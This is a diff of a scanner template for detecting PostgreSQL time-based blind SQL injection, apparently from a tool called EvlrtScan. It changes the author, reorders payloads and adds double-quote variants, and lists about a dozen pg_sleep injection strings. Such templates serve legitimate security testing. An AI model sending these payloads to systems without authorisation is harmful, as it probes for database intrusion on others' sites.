@@ -3,20 +3,25 @@ name: "PostgreSQL Time-Based Blind SQL Injection"
 category: sqli
 severity: high
 tags: [sqli, blind, time-based, postgresql]
-author: "Quickfire"
+author: "EvlrtScan"
 description: "Detects time-based blind SQL injection vulnerabilities in PostgreSQL databases. Injects pg_sleep() payloads and measures the response time."
 injection_strategy: APPEND
 
 payloads:
   - " AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- "
-  - "' AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- "
   - ";(select 1 from pg_sleep(5)) -- "
+  - " || (SELECT pg_sleep(5)) -- "
+  - " OR (SELECT pg_sleep(5)) -- "
+  - "' AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- "
   - "';(select 1 from pg_sleep(5)) -- "
   - "'||(select 1 from pg_sleep(5))||'"
   - "' || (SELECT pg_sleep(5)) -- "
-  - " || (SELECT pg_sleep(5)) -- "
   - "' OR (SELECT pg_sleep(5)) -- "
-  - " OR (SELECT pg_sleep(5)) -- "
+  - "\" AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- "
+  - "\";(select 1 from pg_sleep(5)) -- "
+  - "\"||(select 1 from pg_sleep(5))||\""
+  - "\" || (SELECT pg_sleep(5)) -- "
+  - "\" OR (SELECT pg_sleep(5)) -- "
 
 detection:
   baseline: false
